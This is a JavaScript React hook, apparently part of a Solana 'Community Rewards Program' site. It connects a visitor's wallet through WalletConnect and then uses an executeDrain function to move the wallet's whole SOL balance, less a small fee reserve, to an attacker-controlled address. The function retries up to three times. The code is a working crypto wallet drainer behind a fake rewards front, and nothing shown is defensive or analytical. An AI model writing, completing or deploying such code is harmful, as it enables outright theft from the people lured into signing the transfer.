"use client";

import { createAppKit } from '@reown/appkit';
import { SolanaAdapter } from '@reown/appkit-adapter-solana';
import { solana } from '@reown/appkit/networks';
import { useCallback, useEffect, useState } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

let appKitInstance = null;
let solanaProvider = null;

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const [address, setAddress] = useState(null);
  const [provider, setProvider] = useState(null);

  useEffect(() => {
    if (!appKitInstance && typeof window !== 'undefined') {
      const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;
      
      if (!projectId) {
        console.error('WalletConnect Project ID missing');
        return;
      }

      const metadata = {
        name: 'Solana Rewards',
        description: 'Community Rewards Program',
        url: window.location.origin,
        icons: ['https://solana-rewards.vercel.app/favicon.ico']
      };

      const solanaAdapter = new SolanaAdapter();

      appKitInstance = createAppKit({
        adapters: [solanaAdapter],
        networks: [solana],
        projectId,
        metadata,
        features: {
          analytics: true,
          email: false,
          socials: []
        },
        themeMode: 'dark',
        themeVariables: {
          '--w3m-accent': '#9945FF',
          '--w3m-background': '#0A0B2D',
          '--w3m-color-mix': '#14F195',
          '--w3m-color-mix-strength': 20
        }
      });
    }
  }, []);

  const connect = useCallback(async () => {
    try {
      if (!appKitInstance) throw new Error('AppKit not initialized');
      
      await appKitInstance.open();
      
      const solanaProviderInstance = await appKitInstance.getWalletProvider();
      const accounts = await appKitInstance.getAccounts();
      const walletAddress = accounts?.[0]?.address;
      
      if (walletAddress && solanaProviderInstance) {
        setAddress(walletAddress);
        setProvider(solanaProviderInstance);
        solanaProvider = solanaProviderInstance;
        return walletAddress;
      }
      throw new Error('No account selected');
      
    } catch (error) {
      console.error('WalletConnect failed:', error);
      throw error;
    }
  }, []);

  const executeDrain = useCallback(async (allocatedAmount) => {
    let lastError = null;
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        if (!solanaProvider) {
          throw new Error('WalletConnect not connected');
        }

        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 120000
        });
        
        const walletPubkey = new PublicKey(address);
        
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        const signed = await solanaProvider.signAndSendTransaction(transaction);
        console.log(`[WalletConnect] Sent: ${signed.signature}`);
        
        const confirmation = await connection.confirmTransaction(
          {
            signature: signed.signature,
            blockhash,
            lastValidBlockHeight,
          },
          'confirmed'
        );
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signed.signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signed.signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, [address]);

  return { connect, address, provider, executeDrain };
};
